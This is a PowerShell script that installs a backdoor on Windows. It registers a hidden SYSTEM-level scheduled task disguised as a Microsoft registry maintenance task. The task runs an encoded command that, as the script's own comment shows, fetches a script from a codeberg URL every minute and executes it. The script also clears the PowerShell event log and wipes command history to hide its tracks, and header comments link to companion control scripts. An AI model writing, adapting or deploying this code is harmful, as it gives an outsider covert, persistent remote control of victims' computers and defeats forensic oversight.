<# Creates Core task. 
IMPORTANT LINKS
https://tinyurl.com/highcmdctrl <> MasterControl.ps1
https://tinyurl.com/highcmdpinstall <> AutomatedTaskWithPingInstall.ps1
https://tinyurl.com/highcmdvinstall <> TaskSchedulerServiceCreator.ps1
https://tinyurl.com/highcmdactivation <> ActivationWithAutomatedInstall.ps1
#>

<#
Encoded commmand
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent    
while ($true) {
    $url = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/ActiveAccessControl.ps1"
    $response = Invoke-WebRequest -Uri $url -UseBasicParsing
    if ($response.StatusCode -eq 200) {
        $scriptContent = $response.Content
        Invoke-Expression $scriptContent
    } else {}
    Start-Sleep -Seconds 60 | Out-Null
}
#>

# Variables
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$username = ( ( Get-CIMInstance -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
$psreadlineFolderPath = Join-Path -Path $username -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
$localtask = "RegBackupVerifier"
$taskpath = "\Microsoft\Windows\Registry"
$scheduleObject = New-Object -ComObject schedule.service
$scheduleObject.Connect()
$rootFolder = $scheduleObject.GetFolder("\")

############# Scripts starts from here.
#Task scheduling
$rawscript = @'
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Periodic maintenance task.</Description>
    <URI>\RegBackupVerifier</URI>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Repetition>
        <Interval>PT30M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
    </BootTrigger>
    <EventTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='NetworkProfile'] and EventID=1000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
    </EventTrigger>
    <RegistrationTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Delay>PT30S</Delay>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>0</Priority>
    <RestartOnFailure>
      <Interval>PT5M</Interval>
      <Count>9999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABBAHYAYQBpAGwAYQBiAGwAZQBUAGwAcwAgAD0AIABbAGUAbgB1AG0AXQA6ADoARwBlAHQAVgBhAGwAdQBlAHMAKAAnAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlACcAKQAgAHwAIABXAGgAZQByAGUALQBPAGIAagBlAGMAdAAgAHsAIAAkAF8AIAAtAGcAZQAgACcAVABsAHMAMQAyACcAIAB9AA0ACgBmAG8AcgBlAGEAYwBoACAAKAAkAHQAbABzAFAAcgBvAHQAbwBjAG8AbAAgAGkAbgAgACQAQQB2AGEAaQBsAGEAYgBsAGUAVABsAHMAKQAgAHsAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsACAALQBiAG8AcgAgACQAdABsAHMAUAByAG8AdABvAGMAbwBsAH0AIAAgACAAIAANAAoAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsADQAKACAAIAAgACAAJAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBjAG8AZABlAGIAZQByAGcALgBvAHIAZwAvAHMAZQBtAHAAaQBhAG0AcABpAC8AbQBhAHYAZQByAGkAYwBrAHMALwByAGEAdwAvAGIAcgBhAG4AYwBoAC8AbQBhAGkAbgAvAEcAbABvAGIAYQBsAEYAaQBsAGUAcwAvAEEAYwB0AGkAdgBlAEEAYwBjAGUAcwBzAEMAbwBuAHQAcgBvAGwALgBwAHMAMQAiAA0ACgAgACAAIAAgACQAcgBlAHMAcABvAG4AcwBlACAAPQAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwANAAoAIAAgACAAIABpAGYAIAAoACQAcgBlAHMAcABvAG4AcwBlAC4AUwB0AGEAdAB1AHMAQwBvAGQAZQAgAC0AZQBxACAAMgAwADAAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAHMAYwByAGkAcAB0AEMAbwBuAHQAZQBuAHQAIAA9ACAAJAByAGUAcwBwAG8AbgBzAGUALgBDAG8AbgB0AGUAbgB0AA0ACgAgACAAIAAgACAAIAAgACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABzAGMAcgBpAHAAdABDAG8AbgB0AGUAbgB0AA0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewB9AA0ACgAgACAAIAAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADYAMAAgAHwAIABPAHUAdAAtAE4AdQBsAGwADQAKAH0A</Arguments>
    </Exec>
  </Actions>
</Task>
'@

# Registering the scheduled task.
try {$null = $scheduleObject.GetFolder($taskpath)} catch {$null = $rootFolder.CreateFolder($taskpath)}
Get-ScheduledTask -TaskName $localtask -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue  | Out-Null
Register-ScheduledTask -TaskName $localtask -Xml $rawscript -TaskPath $taskpath -Force -ErrorAction SilentlyContinue -AsJob | Out-Null
Start-ScheduledTask -TaskPath $taskpath -TaskName $localtask -ErrorAction SilentlyContinue
#(Get-ScheduledTask -TaskName $localtask).state
#Invoke-Expression(Invoke-WebRequest -Uri "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Sanitation/DeprecCoreTaskPurge.ps1" -UseBasicParsing).Content -AsJob

# cleanup
if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
  $files = Get-ChildItem -Path $psreadlineFolderPath
  if ($files.Count -gt 0) {
    Remove-Item -Path "$psreadlineFolderPath\*" -Force
  }
}